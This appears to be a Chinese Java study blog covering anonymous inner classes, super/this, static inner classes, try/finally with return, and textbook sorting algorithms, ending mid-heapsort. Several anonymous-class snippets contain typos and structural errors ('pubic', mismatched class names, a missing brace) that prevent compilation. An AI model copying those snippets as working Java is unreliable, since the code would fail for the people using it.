class="line">&#125;</span><br><span class="line"></span><br><span class="line">pubic <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">		Anony anony=<span class="keyword">new</span> anony();</span><br><span class="line">		<span class="comment">// 注意，此处要传入一个匿名类对象</span></span><br><span class="line">		anony.test(<span class="keyword">new</span> Product()&#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">578.6</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&quot;联想笔记本&quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>调用了Anony的test方法，并为其传入一个新new的Product实例作为参数</p>
</blockquote>
<p>打印结果：</p>
<p><img src="https://i.loli.net/2021/08/19/Lk1PwGce7rtjJub.png" alt="image-20210819141211652"></p>
<h4 id="继承抽象父类"><a href="#继承抽象父类" class="headerlink" title="继承抽象父类"></a>继承抽象父类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Device</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">double</span>  <span class="title">getPrice</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">	 	<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Device</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Device</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name=name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Device</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(Device device)</span></span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;购买了一个&quot;</span>+device.getName()+<span class="string">&quot;花费了&quot;</span>+device.getPrice());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pubic <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">		Anony anony=<span class="keyword">new</span> anony();</span><br><span class="line">		<span class="comment">// 注意，此处要传入一个匿名类对象</span></span><br><span class="line">		anony.test(<span class="keyword">new</span> Device(<span class="string">&quot;海尔电视机&quot;</span>)&#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">578.6</span>;</span><br><span class="line">				&#125;</span><br><span class="line">		);</span><br><span class="line">		Device device=<span class="keyword">new</span> Device()&#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">556.56</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&quot;美的电视机&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">		annoy.test(device);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>调用、传参过程与上一个相似</p>
</blockquote>
<p>打印结果：</p>
<p><img src="https://i.loli.net/2021/08/19/oxgmH6hVTzdWLAy.png" alt="image-20210819141434202"></p>
<h2 id="忘记点2：super关键字的使用"><a href="#忘记点2：super关键字的使用" class="headerlink" title="忘记点2：super关键字的使用"></a>忘记点2：super关键字的使用</h2><p><strong>super指向当前对象的父类特征</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//父类，Animal类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Animal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Animal类的无参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类，Cat类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Cat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Cat类的无参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行下面代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cat c1 = <span class="keyword">new</span> Cat(); </span><br></pre></td></tr></table></figure>

<p>打印结果：</p>
<p><img src="https://i.loli.net/2021/08/19/APEmo52ZcrhHGI1.png" alt="image-20210819141724393"></p>
<p><strong>默认会</strong>在构造方法中的<strong>第一行隐式地</strong>添加一个父类的无参构造函数（也可以手动添加其他构造函数，如下图）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">new</span> Cat(); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//父类，Animal类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Animal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		System.out.println(<span class="string">&quot;1：Animal类的无参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Animal</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		System.out.println(<span class="string">&quot;2：Animal类的有int参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类，Cat类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Cat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">		System.out.println(<span class="string">&quot;3：Cat类的无参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Cat</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(<span class="number">5</span>);</span><br><span class="line">		System.out.println(<span class="string">&quot;4：Cat类的有String参数构造函数执行&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="忘记点3：this关键的使用"><a href="#忘记点3：this关键的使用" class="headerlink" title="忘记点3：this关键的使用"></a>忘记点3：this关键的使用</h2><p><strong>this指向当前对象自己，super指向当前对象的父类型特征，故this的东西比super多，也就是super是this的一部分；</strong></p>
<h2 id="忘记点4：static的作用"><a href="#忘记点4：static的作用" class="headerlink" title="忘记点4：static的作用"></a>忘记点4：static的作用</h2><p><strong>从可见性来看：</strong>有static修饰的时候，对外是可见的；否则，对外不可见，必须有一个外部类（或者对象）的引用才可使用</p>
<p><strong>从内存分析来看：</strong>static修饰的变量，存储在<strong>方法区静态域</strong>中，<strong>被所有线程共享</strong>(<strong>方法区包含所有的class和static变量</strong>)</p>
<h3 id="案例：静态和非静态内部类"><a href="#案例：静态和非静态内部类" class="headerlink" title="案例：静态和非静态内部类"></a>案例：静态和非静态内部类</h3><p><strong>两种的创建对象方式不同</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.定义一个函数式接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestLambda</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 3.非静态内部类（对外不直接可见，必须有一个外部类的引用才能被创建）</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Like2</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.静态内部类（对外直接可见，可以直接创建对象）</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Like3</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Like like;</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> TestLambda().<span class="function">new <span class="title">Like2</span><span class="params">()</span></span>;    <span class="comment">// 创建非静态内部类</span></span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> Like3();     <span class="comment">//  创建静态内部类</span></span><br><span class="line">        like.lambda();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="忘记点5：try中有return，finally还会执行吗"><a href="#忘记点5：try中有return，finally还会执行吗" class="headerlink" title="忘记点5：try中有return，finally还会执行吗"></a>忘记点5：try中有return，finally还会执行吗</h2><p>答案是肯定的，java官方文档是这么描述的：</p>
<blockquote>
<p>​    The <code>finally</code> block <em>always</em> executes when the <code>try</code> block exits.`</p>
</blockquote>
<p>即try执行完成之后，finally一定会执行的。这个特性可以让程序员避免在try语句中使用了return，continue或者break关键字而忽略了关闭相关资源的操作。把清理相关资源放在finally语句块中一直是最佳实践。</p>
<p>更详解释：<a href="https://blog.csdn.net/Hningning/article/details/104506944/">(10条消息) try中有return，finally还会执行吗？_Hningning的博客-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>Java基础</tag>
        <tag>匿名内部类</tag>
        <tag>super</tag>
        <tag>this</tag>
        <tag>static</tag>
        <tag>try中的return</tag>
      </tags>
  </entry>
  <entry>
    <title>java中排序</title>
    <url>/2024/05/22/java%E4%B8%AD%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="常见排序算法"><a href="#常见排序算法" class="headerlink" title="常见排序算法"></a>常见排序算法</h2><span id="more"></span>

<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240522122243.png" alt="image-20240522122241218"></p>
<h3 id="概览比较"><a href="#概览比较" class="headerlink" title="概览比较"></a>概览比较</h3><table>
<thead>
<tr>
<th>排序算法</th>
<th>时间复杂度（平均）</th>
<th>时间复杂度（最坏）</th>
<th>时间复杂度（最好）</th>
<th>空间复杂度</th>
<th>稳定性</th>
</tr>
</thead>
<tbody><tr>
<td>冒泡排序</td>
<td>O(n^2)</td>
<td>O(n^2)</td>
<td>O(n)</td>
<td>O(1)</td>
<td>稳定</td>
</tr>
<tr>
<td>选择排序</td>
<td>O(n^2)</td>
<td>O(n^2)</td>
<td>O(n^2)</td>
<td>O(1)</td>
<td>不稳定</td>
</tr>
<tr>
<td>插入排序</td>
<td>O(n^2)</td>
<td>O(n^2)</td>
<td>O(n)</td>
<td>O(1)</td>
<td>稳定</td>
</tr>
<tr>
<td>希尔排序</td>
<td>O(n log n)</td>
<td>O(n^2)</td>
<td>O(n)</td>
<td>O(1)</td>
<td>不稳定</td>
</tr>
<tr>
<td>归并排序</td>
<td>O(n log n)</td>
<td>O(n log n)</td>
<td>O(n log n)</td>
<td>O(n)</td>
<td>稳定</td>
</tr>
<tr>
<td>快速排序</td>
<td>O(n log n)</td>
<td>O(n^2)</td>
<td>O(n log n)</td>
<td>O(log n)</td>
<td>不稳定</td>
</tr>
<tr>
<td>堆排序</td>
<td>O(n log n)</td>
<td>O(n log n)</td>
<td>O(n log n)</td>
<td>O(1)</td>
<td>不稳定</td>
</tr>
<tr>
<td>基数排序</td>
<td>O(n*k)</td>
<td>O(n*k)</td>
<td>O(n*k)</td>
<td>O(n+k)</td>
<td>稳定</td>
</tr>
</tbody></table>
<h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = array.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="comment">// 如果当前元素比下一个元素大，交换它们的位置</span></span><br><span class="line">            <span class="keyword">if</span> (array[j] &gt; array[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = array[j];</span><br><span class="line">                array[j] = array[j + <span class="number">1</span>];</span><br><span class="line">                array[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 选择排序算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectionSort</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = array.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> minIndex = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="comment">// 寻找未排序部分中的最小元素的索引</span></span><br><span class="line">            <span class="keyword">if</span> (array[j] &lt; array[minIndex]) &#123;</span><br><span class="line">                minIndex = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将最小元素与当前位置的元素交换</span></span><br><span class="line">        <span class="keyword">int</span> temp = array[minIndex];</span><br><span class="line">        array[minIndex] = array[i];</span><br><span class="line">        array[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 插入排序算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertionSort</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = array.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> key = array[i];</span><br><span class="line">        <span class="keyword">int</span> j = i - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 将大于key的元素向右移动，为key腾出插入位置</span></span><br><span class="line">        <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; array[j] &gt; key) &#123;</span><br><span class="line">            array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        array[j + <span class="number">1</span>] = key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 希尔排序算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shellSort</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = array.length;</span><br><span class="line">    <span class="comment">// 使用希尔增量序列</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> gap = n / <span class="number">2</span>; gap &gt; <span class="number">0</span>; gap /= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="comment">// 对每个增量进行插入排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = gap; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> key = array[i];</span><br><span class="line">            <span class="keyword">int</span> j = i;</span><br><span class="line">            <span class="comment">// 将大于key的元素向后移动</span></span><br><span class="line">            <span class="keyword">while</span> (j &gt;= gap &amp;&amp; array[j - gap] &gt; key) &#123;</span><br><span class="line">                array[j] = array[j - gap];</span><br><span class="line">                j -= gap;</span><br><span class="line">            &#125;</span><br><span class="line">            array[j] = key;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="归并排序（递归）"><a href="#归并排序（递归）" class="headerlink" title="归并排序（递归）"></a>归并排序（递归）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用归并排序算法对数组进行排序</span></span><br><span class="line">mergeSort(array, <span class="number">0</span>, array.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 归并排序算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// 分割数组为两个子数组</span></span><br><span class="line">        mergeSort(array, left, mid);</span><br><span class="line">        mergeSort(array, mid + <span class="number">1</span>, right);</span><br><span class="line">        <span class="comment">// 合并两个子数组</span></span><br><span class="line">        merge(array, left, mid, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并两个子数组</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> left, <span class="keyword">int</span> mid, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 计算两个子数组的长度</span></span><br><span class="line">    <span class="keyword">int</span> n1 = mid - left + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> n2 = right - mid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建临时数组</span></span><br><span class="line">    <span class="keyword">int</span>[] leftArray = <span class="keyword">new</span> <span class="keyword">int</span>[n1];</span><br><span class="line">    <span class="keyword">int</span>[] rightArray = <span class="keyword">new</span> <span class="keyword">int</span>[n2];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将数据复制到临时数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n1; i++) &#123;</span><br><span class="line">        leftArray[i] = array[left + i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n2; j++) &#123;</span><br><span class="line">        rightArray[j] = array[mid + <span class="number">1</span> + j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并临时数组并将结果存回原始数组</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = left;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n1 &amp;&amp; j &lt; n2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (leftArray[i] &lt;= rightArray[j]) &#123;</span><br><span class="line">            array[k] = leftArray[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            array[k] = rightArray[j];</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复制剩余的元素（如果有）</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; n1) &#123;</span><br><span class="line">        array[k] = leftArray[i];</span><br><span class="line">        i++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j &lt; n2) &#123;</span><br><span class="line">        array[k] = rightArray[j];</span><br><span class="line">        j++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="快速排序（递归）"><a href="#快速排序（递归）" class="headerlink" title="快速排序（递归）"></a>快速排序（递归）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 快速排序算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line">        <span class="comment">// 将数组划分为两部分，并获取划分点的索引</span></span><br><span class="line">        <span class="keyword">int</span> partitionIndex = partition(array, low, high);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递归地对划分的两部分进行排序</span></span><br><span class="line">        quickSort(array, low, partitionIndex - <span class="number">1</span>);</span><br><span class="line">        quickSort(array, partitionIndex + <span class="number">1</span>, high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数组划分为两部分，并返回划分点的索引</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 选择最右边的元素作为划分点（也可以选择其他元素作为划分点）</span></span><br><span class="line">    <span class="keyword">int</span> pivot = array[high];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义划分点的索引</span></span><br><span class="line">    <span class="keyword">int</span> i = low - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历数组，将小于划分点的元素放在左侧，大于划分点的元素放在右侧</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = low; j &lt; high; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[j] &lt; pivot) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(array, i, j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将划分点放在正确的位置上</span></span><br><span class="line">    swap(array, i + <span class="number">1</span>, high);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助方法：交换数组中两个元素的位置</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = array[i];</span><br><span class="line">    array[i] = array[j];</span><br><span class="line">    array[j] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 堆排序算法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapSort</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = array.length;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建最大堆</span></span><br><span class="line">    buildMaxHeap(array, n);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从最后一个非叶子节点开始，依次将根节点与最后一个节点交换，并调整堆</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        swap(array, <span class="number">0</span>, i);</span><br><span class="line">        heapify(array, i, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建最大堆</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 从最后一个非叶子节点开始，依次进行堆化操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        heapify(array, n, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 堆化操作</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> n, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> largest = i; <span class="comment">// 初始化最大元素的索引为根节点</span></span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">2</span> * i + <span class="number">1</span>; <span class="comment">// 左子节点的索引</span></span><br><span class="line">    <span class="keyword">int</span> right = <span class="number">2</span> * i + <span class="number">2</span>; <span class="comment">// 右子节点的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果左子节点大于根节点，则更新最大元素的索引</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; n &amp;&amp; array[left] &gt; array[largest]) &#123;</span><br><span class="line">        largest = left;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果右子节点大于最大元素，则更新最大元素的索引</span></span><br><span class="line">    <span class="keyword">if</span> (right &lt; n &amp;&amp; array[right] &gt; array[largest]) &#123;</span><br><span class="line">        largest = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> 